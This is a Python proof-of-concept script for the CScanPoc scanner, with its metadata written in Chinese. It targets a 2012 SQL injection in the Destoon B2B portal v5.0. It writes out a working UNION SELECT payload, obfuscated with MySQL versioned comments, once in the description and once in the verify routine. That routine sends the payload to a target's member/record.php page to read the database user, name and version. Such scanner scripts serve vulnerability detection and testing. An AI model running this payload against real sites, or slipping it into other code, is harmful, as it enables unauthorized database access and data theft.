# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Destoon_0001_p'  # 平台漏洞编号，留空
    name = 'Destoon SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-08-30'  # 漏洞公布时间
    desc = '''
        Destoon B2B网站管理系统是一套完善的B2B（电子商务）行业门户解决方案。
        Destoon最新全版本通杀SQL注入。
        注入数据：action=pay&mid=-1/*!50000union*//*!50000select*/user(),2,database(),version(),5,6,7,8,9--
    '''  # 漏洞描述
    ref = 'http://www.quwantang.com/destoon%E6%9C%80%E6%96%B0%E5%85%A8%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Destoon'  # 漏洞应用名称
    product_version = 'v5.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5d453229-8476-461b-84c2-0b9f7c5b23ae'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://0day5.com/archives/864/
            # 根据实际情况payload路径可能不同
            payload = '/v5.0/member/record.php'
            data = '?action=pay&mid=-1/*!50000union*//*!50000select*/user(),2,database(),version(),5,6,7,8,9--'
            url = self.target + payload + data
            r = requests.get(url)

            if r.status_code == 200 and 'admin' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
